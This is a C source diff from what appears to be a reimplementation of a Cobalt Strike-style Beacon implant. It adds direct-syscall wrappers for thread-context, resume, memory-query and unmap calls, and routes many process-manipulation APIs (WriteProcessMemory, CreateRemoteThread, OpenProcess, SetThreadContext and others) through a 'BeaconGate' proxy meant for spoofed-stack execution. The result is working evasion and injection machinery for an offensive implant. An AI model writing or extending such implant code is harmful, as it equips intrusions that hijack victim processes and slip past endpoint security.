@@ -651,6 +651,11 @@ typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, 
 typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
 typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG);
 typedef NTSTATUS(NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, void *, HANDLE, void *, void *, ULONG, SIZE_T, SIZE_T, SIZE_T, void *);
+typedef NTSTATUS(NTAPI *fn_NtGetContextThread)(HANDLE, void *);
+typedef NTSTATUS(NTAPI *fn_NtSetContextThread)(HANDLE, void *);
+typedef NTSTATUS(NTAPI *fn_NtResumeThread)(HANDLE, PULONG);
+typedef NTSTATUS(NTAPI *fn_NtQueryVirtualMemory)(HANDLE, PVOID, int, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS(NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
 
 static int sc_method(void) {
 	return syscall_method_get();
@@ -733,6 +738,61 @@ static NTSTATUS sc_call_threadex(PHANDLE out, ACCESS_MASK acc, void * oa, HANDLE
 		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
 	return fn(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
 }
+
+static NTSTATUS sc_call_getctx(HANDLE t, void * ctx) {
+	int m = sc_method();
+	fn_NtGetContextThread fn;
+	if (m == 0 || !sc_getctx.ready)
+		return ((fn_NtGetContextThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetContextThread"))(t, ctx);
+	fn = (fn_NtGetContextThread)make_exec(&sc_getctx, m == 2);
+	if (fn == NULL)
+		return ((fn_NtGetContextThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetContextThread"))(t, ctx);
+	return fn(t, ctx);
+}
+
+static NTSTATUS sc_call_setctx(HANDLE t, void * ctx) {
+	int m = sc_method();
+	fn_NtSetContextThread fn;
+	if (m == 0 || !sc_setctx.ready)
+		return ((fn_NtSetContextThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetContextThread"))(t, ctx);
+	fn = (fn_NtSetContextThread)make_exec(&sc_setctx, m == 2);
+	if (fn == NULL)
+		return ((fn_NtSetContextThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetContextThread"))(t, ctx);
+	return fn(t, ctx);
+}
+
+static NTSTATUS sc_call_resume(HANDLE t, PULONG prev) {
+	int m = sc_method();
+	fn_NtResumeThread fn;
+	if (m == 0 || !sc_resume.ready)
+		return ((fn_NtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread"))(t, prev);
+	fn = (fn_NtResumeThread)make_exec(&sc_resume, m == 2);
+	if (fn == NULL)
+		return ((fn_NtResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeThread"))(t, prev);
+	return fn(t, prev);
+}
+
+static NTSTATUS sc_call_qvmem(HANDLE p, PVOID base, int cls, PVOID mbi, SIZE_T len, PSIZE_T ret) {
+	int m = sc_method();
+	fn_NtQueryVirtualMemory fn;
+	if (m == 0 || !sc_qvmem.ready)
+		return ((fn_NtQueryVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryVirtualMemory"))(p, base, cls, mbi, len, ret);
+	fn = (fn_NtQueryVirtualMemory)make_exec(&sc_qvmem, m == 2);
+	if (fn == NULL)
+		return ((fn_NtQueryVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryVirtualMemory"))(p, base, cls, mbi, len, ret);
+	return fn(p, base, cls, mbi, len, ret);
+}
+
+static NTSTATUS sc_call_unmap(HANDLE p, PVOID base) {
+	int m = sc_method();
+	fn_NtUnmapViewOfSection fn;
+	if (m == 0 || !sc_unmap.ready)
+		return ((fn_NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"))(p, base);
+	fn = (fn_NtUnmapViewOfSection)make_exec(&sc_unmap, m == 2);
+	if (fn == NULL)
+		return ((fn_NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"))(p, base);
+	return fn(p, base);
+}
 #else
 void syscalls_resolve(void) {}
 int syscalls_ssn_ntwrite(void) { return 0; }
@@ -745,9 +805,13 @@ BOOL syscalls_fill_beacon_syscalls(PBEACON_SYSCALLS info, SIZE_T infoSize, BOOL 
 }
 #endif
 
-/* ===================== Win32-shaped gate wrappers ===================== */
+/* ===================== Win32-shaped gate wrappers =====================
+ * BeaconGate first, then the syscall method, then the plain API (official:
+ * the gate takes precedence over syscall_method). */
 
 BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) {
+	if (gate_api_enabled(GATE_API_WRITEPROCESSMEMORY))
+		return gate_WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
 #if defined(_M_X64)
 	NTSTATUS st;
 	SIZE_T wrote = 0;
@@ -763,6 +827,8 @@ BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lp
 }
 
 BOOL beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead) {
+	if (gate_api_enabled(GATE_API_READPROCESSMEMORY))
+		return gate_ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
 #if defined(_M_X64)
 	NTSTATUS st;
 	SIZE_T got = 0;
@@ -778,6 +844,8 @@ BOOL beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpB
 }
 
 BOOL beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
+	if (gate_api_enabled(GATE_API_DUPLICATEHANDLE))
+		return gate_DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
 #if defined(_M_X64)
 	NTSTATUS st;
 	ULONG attr;
@@ -797,7 +865,7 @@ LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
 	PVOID base = lpAddress;
 	SIZE_T size = dwSize;
 
-	/* C-58 BeaconGate: proxied execution (spoofed stack when available) */
+	/* BeaconGate: proxied through the executor when on for this API */
 	if (gate_api_enabled(GATE_API_VIRTUALALLOCEX))
 		return gate_VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
 
@@ -817,7 +885,6 @@ BOOL beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, D
 	SIZE_T size = dwSize;
 	ULONG oldp = 0;
 
-	/* C-58 BeaconGate */
 	if (gate_api_enabled(GATE_API_VIRTUALPROTECTEX))
 		return gate_VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
 
@@ -848,6 +915,8 @@ BOOL beacon_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWOR
 }
 
 HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD outId) {
+	if (gate_api_enabled(GATE_API_CREATEREMOTETHREAD))
+		return gate_CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
 #if defined(_M_X64)
 	NTSTATUS st;
 	HANDLE th = NULL;
@@ -939,6 +1008,8 @@ static NTSTATUS sc_call_writefile(HANDLE fh, HANDLE ev, void * apc, void * apcr,
 #endif
 
 HANDLE beacon_OpenProcess(DWORD access, BOOL inherit, DWORD pid) {
+	if (gate_api_enabled(GATE_API_OPENPROCESS))
+		return gate_OpenProcess(access, inherit, pid);
 #if defined(_M_X64)
 	G3_OA oa;
 	struct { HANDLE pid; HANDLE tid; } cid;
@@ -959,6 +1030,8 @@ HANDLE beacon_OpenProcess(DWORD access, BOOL inherit, DWORD pid) {
 }
 
 HANDLE beacon_OpenThread(DWORD access, BOOL inherit, DWORD tid) {
+	if (gate_api_enabled(GATE_API_OPENTHREAD))
+		return gate_OpenThread(access, inherit, tid);
 #if defined(_M_X64)
 	G3_OA oa;
 	struct { HANDLE pid; HANDLE tid; } cid;
@@ -979,6 +1052,8 @@ HANDLE beacon_OpenThread(DWORD access, BOOL inherit, DWORD tid) {
 }
 
 BOOL beacon_CloseHandle(HANDLE h) {
+	if (gate_api_enabled(GATE_API_CLOSEHANDLE))
+		return gate_CloseHandle(h);
 #if defined(_M_X64)
 	if (syscall_method_get() == 0)
 		return CloseHandle(h);
@@ -1038,6 +1113,151 @@ HANDLE beacon_CreateFileA(LPCSTR name, DWORD access, DWORD share, LPSECURITY_ATT
 	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
 #else
 	return CreateFileA(name, access, share, sa, disp, flags, tmpl);
+#endif
+}
+
+/* ---- the rest of the BeaconGate API set (4.10): BOF system-call API ---- */
+
+LPVOID beacon_VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD protect) {
+	if (gate_api_enabled(GATE_API_VIRTUALALLOC))
+		return gate_VirtualAlloc(addr, size, type, protect);
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = addr;
+	SIZE_T len = size;
+
+	if (syscall_method_get() == 0)
+		return VirtualAlloc(addr, size, type, protect);
+	if (len == 0)
+		len = 1; /* Nt rejects a zero region; VirtualAlloc rounds it up to a page */
+	st = sc_call_alloc(GetCurrentProcess(), &base, 0, &len, type, protect);
+	return NT_SUCCESS(st) ? (LPVOID)base : NULL;
+#else
+	return VirtualAlloc(addr, size, type, protect);
+#endif
+}
+
+BOOL beacon_VirtualProtect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD old) {
+	if (gate_api_enabled(GATE_API_VIRTUALPROTECT))
+		return gate_VirtualProtect(addr, size, protect, old);
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = addr;
+	SIZE_T len = size;
+	ULONG oldp = 0;
+
+	if (syscall_method_get() == 0)
+		return VirtualProtect(addr, size, protect, old);
+	st = sc_call_protect(GetCurrentProcess(), &base, &len, protect, &oldp);
+	if (old)
+		*old = oldp;
+	return NT_SUCCESS(st);
+#else
+	return VirtualProtect(addr, size, protect, old);
+#endif
+}
+
+BOOL beacon_VirtualFree(LPVOID addr, SIZE_T size, DWORD freetype) {
+	if (gate_api_enabled(GATE_API_VIRTUALFREE))
+		return gate_VirtualFree(addr, size, freetype);
+#if defined(_M_X64)
+	NTSTATUS st;
+	PVOID base = addr;
+	SIZE_T len = size;
+
+	if (syscall_method_get() == 0)
+		return VirtualFree(addr, size, freetype);
+	st = sc_call_free(GetCurrentProcess(), &base, &len, freetype);
+	return NT_SUCCESS(st);
+#else
+	return VirtualFree(addr, size, freetype);
+#endif
+}
+
+SIZE_T beacon_VirtualQuery(LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len) {
+	if (gate_api_enabled(GATE_API_VIRTUALQUERY))
+		return gate_VirtualQuery(addr, mbi, len);
+#if defined(_M_X64)
+	NTSTATUS st;
+	SIZE_T got = 0;
+
+	if (syscall_method_get() == 0)
+		return VirtualQuery(addr, mbi, len);
+	st = sc_call_qvmem(GetCurrentProcess(), (PVOID)addr, 0 /* MemoryBasicInformation */, mbi, len, &got);
+	return NT_SUCCESS(st) ? got : 0;
+#else
+	return VirtualQuery(addr, mbi, len);
+#endif
+}
+
+BOOL beacon_GetThreadContext(HANDLE thread, CONTEXT * ctx) {
+	if (gate_api_enabled(GATE_API_GETTHREADCONTEXT))
+		return gate_GetThreadContext(thread, ctx);
+#if defined(_M_X64)
+	if (syscall_method_get() == 0)
+		return GetThreadContext(thread, ctx);
+	/* native CONTEXT only - the WOW64 forms stay on their Win32 path */
+	return NT_SUCCESS(sc_call_getctx(thread, ctx));
+#else
+	return GetThreadContext(thread, ctx);
+#endif
+}
+
+BOOL beacon_SetThreadContext(HANDLE thread, CONTEXT * ctx) {
+	if (gate_api_enabled(GATE_API_SETTHREADCONTEXT))
+		return gate_SetThreadContext(thread, ctx);
+#if defined(_M_X64)
+	if (syscall_method_get() == 0)
+		return SetThreadContext(thread, ctx);
+	return NT_SUCCESS(sc_call_setctx(thread, ctx));
+#else
+	return SetThreadContext(thread, ctx);
+#endif
+}
+
+DWORD beacon_ResumeThread(HANDLE thread) {
+	if (gate_api_enabled(GATE_API_RESUMETHREAD))
+		return gate_ResumeThread(thread);
+#if defined(_M_X64)
+	NTSTATUS st;
+	ULONG prev = 0;
+
+	if (syscall_method_get() == 0)
+		return ResumeThread(thread);
+	st = sc_call_resume(thread, &prev);
+	return NT_SUCCESS(st) ? (DWORD)prev : (DWORD)-1;
+#else
+	return ResumeThread(thread);
+#endif
+}
+
+HANDLE beacon_CreateThread(LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD id) {
+	if (gate_api_enabled(GATE_API_CREATETHREAD))
+		return gate_CreateThread(sa, stack, start, param, flags, id);
+	return CreateThread(sa, stack, start, param, flags, id);
+}
+
+HANDLE beacon_CreateFileMappingA(HANDLE file, LPSECURITY_ATTRIBUTES sa, DWORD protect, DWORD high, DWORD low, const char * name) {
+	if (gate_api_enabled(GATE_API_CREATEFILEMAPPINGA))
+		return gate_CreateFileMappingA(file, sa, protect, high, low, name);
+	return CreateFileMappingA(file, sa, protect, high, low, name);
+}
+
+LPVOID beacon_MapViewOfFile(HANDLE map, DWORD access, DWORD high, DWORD low, SIZE_T size) {
+	if (gate_api_enabled(GATE_API_MAPVIEWOFFILE))
+		return gate_MapViewOfFile(map, access, high, low, size);
+	return MapViewOfFile(map, access, high, low, size);
+}
+
+BOOL beacon_UnmapViewOfFile(LPCVOID base) {
+	if (gate_api_enabled(GATE_API_UNMAPVIEWOFFILE))
+		return gate_UnmapViewOfFile(base);
+#if defined(_M_X64)
+	if (syscall_method_get() == 0)
+		return UnmapViewOfFile(base);
+	return NT_SUCCESS(sc_call_unmap(GetCurrentProcess(), (PVOID)base));
+#else
+	return UnmapViewOfFile(base);
 #endif
 }
 
